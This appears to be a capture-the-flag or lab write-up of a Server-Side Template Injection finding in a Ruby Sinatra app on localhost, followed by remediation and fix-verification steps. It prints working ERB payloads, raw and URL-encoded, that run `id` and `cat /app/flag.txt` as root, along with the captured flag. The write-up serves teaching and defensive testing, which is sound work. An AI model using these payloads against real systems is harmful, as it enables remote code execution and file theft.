## TL;DR
- Objective: Discover and exploit vulnerabilities in a web application that repeats user input
- Outcome: Successfully exploited Server-Side Template Injection (SSTI) to achieve RCE and capture flag
- Highest-impact finding: Critical SSTI vulnerability leading to remote code execution as root
- Validation status: **CONFIRMED** - Flag captured: `FLAG{129553c73fc5601ea301c317809967bd8b922a69a8a528343d396ed6c13858e9}`

## Target Information
- Target: 127.0.0.1:33023
- Host / base URL: http://127.0.0.1:33023
- Application or component: RepeatMePlease (Ruby Sinatra web application)
- Authentication context: None required - public application
- Relevant technology details: Ruby, Sinatra framework, ERB (Embedded Ruby) templating engine

## Confirmed Vulnerability
### Server-Side Template Injection (SSTI) in Ruby ERB
- Affected endpoint / component: POST /generate, `sentence` parameter
- Impact: Critical - Remote Code Execution (RCE) as root (uid=0), full system compromise
- Preconditions: None - No authentication required; client-side validation easily bypassed by direct HTTP requests
- Exact payload or PoC: URL-encoded `<%=`cat /app/flag.txt`%>` sent as `sentence` parameter

## Steps to Reproduce
1. Send POST request to `http://127.0.0.1:33023/generate` with parameters `sentence` and `number`
2. For SSTI detection, use arithmetic payload: `sentence=%3C%25%3D7%2A7%25%3E&number=1` (URL-encoded `<%=7*7%>`)
3. Observe response containing `49` confirming template evaluation
4. For RCE, use command execution payload: `sentence=%3C%25%3D%60id%60%25%3E&number=1` (URL-encoded `<%=`id`%>`)
5. Observe response containing `uid=0(root) gid=0(root) groups=0(root)` confirming root-level execution
6. Extract flag with: `sentence=%3C%25%3D%60cat%20%2Fapp%2Fflag.txt%60%25%3E&number=1` (URL-encoded `<%=`cat /app/flag.txt`%>`)

## Validation / Evidence
- Validation token / flag: `FLAG{129553c73fc5601ea301c317809967bd8b922a69a8a528343d396ed6c13858e9}`
- Tool evidence: Direct HTTP POST requests to /generate endpoint using curl/browser
- Request evidence:
  - SSTI Detection: `POST /generate sentence=%3C%25%3D7%2A7%25%3E&number=1`
  - RCE Confirmation: `POST /generate sentence=%3C%25%3D%60id%60%25%3E&number=1`
  - Flag Extraction: `POST /generate sentence=%3C%25%3D%60cat%20%2Fapp%2Fflag.txt%60%25%3E&number=1`
- Response evidence:
  - SSTI Detection: `<p>49</p>` (confirms 7*7=49 template evaluation)
  - RCE Confirmation: `<p>uid=0(root) gid=0(root) groups=0(root)\n</p>`
  - Flag Extraction: `<p>FLAG{129553c73fc5601ea301c317809967bd8b922a69a8a528343d396ed6c13858e9}\n</p>`
- Notes on reliability / limitations: Exploitation is highly reliable; client-side JavaScript validation (alphanumeric + spaces, max 200 chars) is bypassed by sending direct HTTP POST requests; server-side filtering was bypassed using URL-encoding

## Remediation
- Root cause: The application passes user-controlled `sentence` parameter directly to ERB (Embedded Ruby) template engine without sanitization or validation. Ruby's ERB interprets `<%= %>` tags and executes arbitrary Ruby code including backtick command execution.
- Recommended fix:
  1. **Never pass user input to template engines** - Use static templates with proper parameterization
  2. Replace ERB rendering with safe string interpolation: `ERB.escape_html(params[:sentence])` or use `<%=h %>` HTML escaping helper
  3. Implement server-side input validation with allowlist of acceptable characters
  4. Use Content Security Policy headers to mitigate XSS if template injection is partially prevented
  5. Run application with least-privilege user (not root) to limit impact of any RCE
- Defense-in-depth:
  - Deploy Web Application Firewall (WAF) rules to detect ERB template injection patterns (`<%`, `%>`, `<%=`, backticks)
  - Implement input/output encoding at application layer
  - Enable process isolation and containerization
  - Apply principle of least privilege to file system and system commands

## How to Verify the Fix
1. Attempt to inject ERB template syntax via POST to `/generate` with `sentence=<%=7*7%>&number=1`
2. Expected secure result: Response should display literal string `<%=7*7%>` or `<%=` escaped, NOT the evaluated result `49`
3. Verify server is not running as root: Execute legitimate request and check server process user
4. Attempt command injection with `sentence=<%=`id`%>&number=1`
5. Expected secure result: Response should display escaped string, not system command output

## Remaining Leads
- Confirmed blockers: None - vulnerability fully exploited
- Unverified leads: None
- Missing context: None - full chain from discovery to exploitation documented

## Appendix: Raw Payloads (Decoded)
```
SSTI Detection: <%=7*7%>
RCE Confirmation: <%=`id`%>
Flag Extraction: <%=`cat /app/flag.txt`%>
```

## Appendix: URL-Encoded Payloads (As Sent)
```
SSTI Detection: %3C%25%3D7%2A7%25%3E
RCE Confirmation: %3C%25%3D%60id%60%25%3E
Flag Extraction: %3C%25%3D%60cat%20%2Fapp%2Fflag.txt%60%25%3E
```
